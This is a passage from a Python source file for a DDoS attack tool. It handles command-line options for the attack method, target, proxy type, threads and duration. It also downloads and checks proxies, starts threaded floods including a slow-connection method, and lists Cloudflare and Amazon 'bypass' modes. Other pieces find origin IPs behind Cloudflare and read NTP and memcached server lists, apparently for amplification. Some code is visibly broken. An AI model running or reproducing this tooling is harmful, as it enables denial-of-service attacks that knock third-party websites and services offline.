    if method == "check":
        proxydl(out_file, socks_type)
        exit()
    if method == "stop":
        url = str(sys.argv[2]).strip()
        UrlFixer(url)
        stop()
    elif (method == "help") or (method == "h"):
        usge()
    elif (method == "check"):
        pass
    elif str(method.upper()) not in str(methods):
        print("method not found")
        exit()
    timer = int(time.time()) + int(sys.argv[7])
    url = str(sys.argv[2]).strip()
    UrlFixer(url)
    choice = str(sys.argv[3]).strip()
    if choice != "4" and choice != "5" and choice != "1":
        print("Socks Type Not Found [4, 5, 1]")
        exit()
    if choice == "4":
        socks_type = 4
    elif choice == "1":
        socks_type = 1
    else:
        socks_type = 5
    threads = int(sys.argv[4])
    proxies = open(out_file).readlines()
    if method == "slow":
        conn = threads
        proxydl(out_file, socks_type)
        print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],len(proxies), str(nums)))

        for _ in range(conn):
            threading.Thread(target=slow, args=(conn, socks_type), daemon=True).start()
    else:
        multiple = str((sys.argv[6]))
        if multiple == "":
            multiple = int(100)
        else:
            multiple = int(multiple)
        event = threading.Event()
        start_attack(method, threads, event, socks_type)
        event.clear()
        event.set()
    while True:
        try:
            sleep(0.1)
        except KeyboardInterrupt:
            break


def proxydl(out_file, socks_type):
    global proxies, multiple, choice, data
    ms = 1
    if socks_type == 1:
        socktyper = "HTTP"
    if socks_type == 4:
        socktyper = "SOCKS4"
    if socks_type == 5:
        socktyper = "SOCKS5"
    print(color.RED + "          ╔═══════════════════════════════════════╗" + color.END)
    print(color.RED + "             ╔═══╦═══╦═══╦════╗╔═══╦═══╦═══╦═══╗   " + color.END)
    print(color.RED + "             ║╔══╣╔═╗║╔═╗║╔╗╔╗║╚╗╔╗╠╗╔╗║╔═╗║╔═╗║   " + color.END)
    print(color.RED + "             ║╚══╣║ ║║╚═╝╠╝║║╚╝ ║║║║║║║║║ ║║╚══╗   " + color.END)
    print(color.RED + "             ║╔══╣║ ║║╔╗╔╝ ║║   ║║║║║║║║║ ║╠══╗║   " + color.END)
    print(color.RED + "             ║║  ║╚═╝║║║╚╗ ║║  ╔╝╚╝╠╝╚╝║╚═╝║╚═╝║   " + color.END)
    print(color.RED + "             ╚╝  ╚═══╩╝╚═╝ ╚╝  ╚═══╩═══╩═══╩═══╝   " + color.END)
    print(color.RED + "          ╚══╦════════════════════════════════╦═══╝" + color.END)
    print(color.RED + "          ╔══╩════════════════════════════════╩═══╗" + color.END)
    print(color.RED + "          ║   "+ color.END + color.BLUE +             "DOWNLOADING PROXIES PLS WAIT... " + color.END + color.RED + "    ║"+ color.END)
    print(color.RED + "          ╚═══════════════════════════════════════╝   " + color.END)
    downloadsocks(choice)
    proxies = open(str(out_file)).readlines()
    check_list(out_file)
    check_socks(ms)



bds = 0


# layer tool :||||||||||||
def toolgui():
    global bds
    tos = str(to).replace("'", "").replace("[", "").replace("]", "").replace(",", "\n")
    if bds == 0:
        print('''
Tools:
 ''' + tos+ '''
Other:
 Clear
 Exit
        ''')
    bds = 1
    tool = input(socket.gethostname() + "@"+name+":~# ").lower()
    if tool != "e" and (tool != "exit") and (tool != "q") and (tool != "quit") and (tool != "logout") and (
            tool != "close"):
        pass
    else:
        exit()
    if tool == "cfip":
        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
        cfip(domain)
        return tools()
    elif tool == "dstat":
        print(tool + ": command ready")
        return tools()
    elif tool == "dns":
        return tools()
    elif tool == "check":
        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
        check(domain)
        return tools()
    elif tool == "ping":
        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
        piger(domain)
        return tools()
    elif tool == "info":
        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
        piger(domain)
        return tools()
    elif (tool == "help") or (tool == "h") or (tool == "?"):
        tos = str(to).replace("'", "").replace("[", "").replace("]", "").replace(",", "\n")
        print('''
Tools:
 {tos}
Other:
 Clear
 Exit
        ''')
        return tools()
    elif (tool == "cls") or (tool == 'clear') or (tool == 'c'):
        print("\033[H\033[J")
        return tools()
    elif not tool:
        return tools()

    elif " " in tool:
        return tools()
    elif "        " in tool:
        return tools()
    elif "  " in tool:
        return tools()
    elif "\n" in tool:
        return tools()
    elif "\r" in tool:
        return tools()

    else:
        print(tool + ": command not found")
        return tools()


def tools():
    global domain, name
    name = "TrojanWave"
    try:
        tool = sys.argv[2].lower()
        if tool != "dstat":
            domain = sys.argv[3]
            if str('.') not in str(domain):
                print('address not found')
                toolgui()
        if tool == "cfip":
            cfip(domain)
        elif tool == "dns":
            print(tool + ": comming soon !")
        elif tool == "check":
            check(domain)
        elif tool == "ping":
            piger(domain)
        elif tool == "dstat":
            address = requests.get('http://ipinfo.io/ip', headers={"User-Agent": UserAgent, }).text
            print('now please attack to {address}')
            os.system('dstat')
        else:
            print('tool not found')
            toolgui()
    except IndexError:
        toolgui()


def cfip(domain):
    if str("http") in str(domain):
        domain = domain.replace('https://', '').replace('http:', '').replace('/')
    URL = "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi"
    r = requests.post(URL, data={"cfS": {domain}}, headers={"User-Agent": UserAgent, }, timeout=1)
    print(r.text)


def check(domain):
    if str("http") not in str(domain):
        domain = "http://" + domain
    print('please wait ...')
    r = requests.get(domain, timeout=20)
    if str("50") in str(r.status_code):
        die = "OFFLINE"
    else:
        die = "ONLINE"
    print('\nstatus_code: '+r.status_code)
    print('status: '+die+'\n')


def piger(siye):
    if str("https") in str(siye):
        domain = str(siye).replace('https', '').replace('/', '').replace(':', '')
    elif str("http") in str(siye):
        domain = str(siye).replace('http', '').replace('/', '').replace(':', '')
    else:
        domain = str(siye)
    print('please wait ...')
    r = pig(domain, count=5, interval=0.2)
    if r.is_alive:
        die = "ONLINE"
    else:
        die = "OFFLINE"
    print('\nAddress: '+r.address)
    print('Ping: '+r.avg_rtt)
    print('Aceepted Packets: '+r.packets_received+'/'+r.packets_sent)
    print('status: '+die+'\n')


def usgeaseets():
    global metho, url, SOCKST, thr, proxylist, muli, tim, l7s, l4s, tos, ots, l3s
    socks = ["1", "4", "5"]
    sockst = ["socks4.txt", "socks5.txt", "http.txt"]
    try:
        if sys.argv[3] not in socks:
            SOCKST = Choice(socks)
        elif sys.argv[3]:
            SOCKST = sys.argv[3]

        else:
            SOCKST = Choice(socks)
    except:
        SOCKST = Choice(socks)

    if (str(SOCKST) == str('1')):
        proxylist = "http.txt"
    else:
        proxylist = "socks{0}.txt".format(SOCKST)

    try:
        met = str(sys.argv[1]).upper()
        if met not in list(methods):
            metho = Choice(methods).lower()
        elif sys.argv[1]:
            metho = sys.argv[1]
        else:
            metho = Choice(methods).lower()
    except:
        metho = Choice(methods).lower()
    try:
        methos = metho.upper()
        if (methos in l4) or (methos in l3):
            url = sys.argv[2]
        elif str("http") not in sys.argv[2]:
            url = "https://example.ir"
        elif sys.argv[2]:
            url = sys.argv[2]
        else:
            url = "https://example.ir"
    except:
        url = "https://example.ir"
    try:
        if sys.argv[4]:
            thr = sys.argv[4]
        else:
            thr = Intn(100, 1000)
    except:
        thr = Intn(10, 1000)
    try:
        if (sys.argv[5] not in sockst):
            exit()
    except IndexError:
        pass
    except:
        print('socks type not found')
        exit()

    try:
        if sys.argv[6]:
            muli = sys.argv[6]
        else:
            muli = Intn(10, 150)
    except:
        muli = Intn(10, 150)
    try:
        if sys.argv[7]:
            tim = sys.argv[7]
        else:
            tim = Intn(10, 10000)
    except:
        tim = Intn(10, 10000)

    l4s = str(l4).replace("'", "").replace("[", "").replace("]", "")
    l3s = str(l3).replace("'", "").replace("[", "").replace("]", "")
    l7s = str(l7).replace("'", "").replace("[", "").replace("]", "")
    tos = str(to).replace("'", "").replace("[", "").replace("]", "")
    ots = str(ot).replace("'", "").replace("[", "").replace("]", "")


def usge():
    usgeaseets()
    print ("")
    print(color.CYAN  + "         ╔═══╦═══╦═══╦════╗╔═══╦═══╦═══╦═══╗"+ color.END) 
    print(color.CYAN  + "         ║╔══╣╔═╗║╔═╗║╔╗╔╗║╚╗╔╗╠╗╔╗║╔═╗║╔═╗║"+ color.END) 
    print(color.CYAN  + "         ║╚══╣║ ║║╚═╝╠╝║║╚╝ ║║║║║║║║║ ║║╚══╗"+ color.END) 
    print(color.CYAN  + "         ║╔══╣║ ║║╔╗╔╝ ║║   ║║║║║║║║║ ║╠══╗║"+ color.END) 
    print(color.CYAN  + "         ║║  ║╚═╝║║║╚╗ ║║  ╔╝╚╝╠╝╚╝║╚═╝║╚═╝║"+ color.END) 
    print(color.CYAN  + "         ╚╝  ╚═══╩╝╚═╝ ╚╝  ╚═══╩═══╩═══╩═══╩═➤ YONE "+ color.END) 
    print(color.CYAN  + "        ══════╦══════════════════════════╦════"+ color.END) 
    print(color.CYAN  + "              ╚╦════════════════════════╦╝"+ color.END)
    print(color.CYAN  + "  ╔════════════╩═══╦════════════════════╩═════════════╗"+ color.END) 
    print(color.CYAN  + "  ║ NORMAL METHODS ║ BYPASS METHODS ║ SPECIAL METHODS ║"+ color.END) 
    print(color.CYAN  + "  ╠════════════════╬════════════════║═════════════════╣"+ color.END) 
    print(color.CYAN  + "  ║ •GETV2         ║  •BYPASS       ║   •HTTPFAST     ║"+ color.END)    
    print(color.CYAN  + "  ║ •POSTV2        ║  •BYPASSV2     ║   •HTTP_BETA    ║"+ color.END) 
    print(color.CYAN  + "  ║ •POST          ║  •AMAZONBYPASS ║   •HTTPFASTV2   ║"+ color.END) 
    print(color.CYAN  + "  ║                ║  •CFBV2        ║   •MIX          ║"+ color.END) 
    print(color.CYAN  + "  ║                ║  •CFB          ║   •MIXV2        ║"+ color.END) 
    print(color.CYAN  + "  ║	            ║ AMAZONBYPASSV2 ║   •KILLALL      ║"+ color.END)
    print(color.CYAN  + "  ║ 	            ║                ║   •SPAMMER      ║"+color.END)
    print(color.CYAN  + "  ╚════════════════╩════════════════╩═════════════════╝"+ color.END)


def makefile(text):
    if text == "files/":
        os.mkdir(text)
    elif text == "files/proxys/":
        os.mkdir(text)
    else:
        open(text, 'w').close()
    print('File: ', text)

if __name__ == '__main__':
    import os, requests, socket, socks, time, random, threading, sys, ssl, datetime, cfscrape, re
    from time import sleep
    from icmplib import ping as pig
    from scapy.layers.inet import TCP
    from scapy.all import *
    from socket import gaierror
    acceptall = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept-Encoding: gzip, deflate",
        "Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Charset: iso-8859-1Accept-Encoding: gzip",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1Accept-Charset: utf-8, iso-8859-1;q=0.5",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
    ]

    data = ""
    strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890"
    Intn = random.randint
    Choice = random.choice
    if not os.path.exists('files/'):
        makefile('files/')
    if not os.path.exists('files/proxys/'):
        makefile('files/proxys/')
    if not os.path.exists('files/useragent.txt'):
        makefile('files/proxys/useragent.txt')
    if not os.path.exists('files/ntp_servers.txt'):
        makefile('files/ntp_servers.txt')
    if not os.path.exists('files/memcached_servers.txt'):
        makefile('files/memcached_servers.txt')
    if not os.path.exists('files/referers.txt'):
        makefile('files/referers.txt')
    try:
        with open("files/useragent.txt", "r") as f:
            readuser = str(f.readlines()).replace('\n', '').replace('\r', '')
        with open("files/referers.txt", "r") as f:
            readref = str(f.readlines()).replace('\n', '').replace('\r', '')
        with open("files/memcached_servers.txt", "r") as f:
            memsv = str(f.readlines()).replace('\n', '').replace('\r', '')
        with open("files/ntp_servers.txt", "r") as f:
            ntpsv = str(f.readlines()).replace('\n', '').replace('\r', '')
        UserAgent = Choice(readuser)
        referers = Choice(readref)
        memcached_servers = Choice(memsv)
        try:
            bdr = str(sys.argv[1]).lower()
            if bdr == "tools":
                tools()
            elif bdr == "stop":
                stop()
            elif bdr == "help":
                usge()
            elif len(sys.argv) <= int(7):
                usge()
            else:
                main()
        except IndexError:
            usge()
    except KeyboardInterrupt:
        sys.exit()
    except IndexError:
        usge()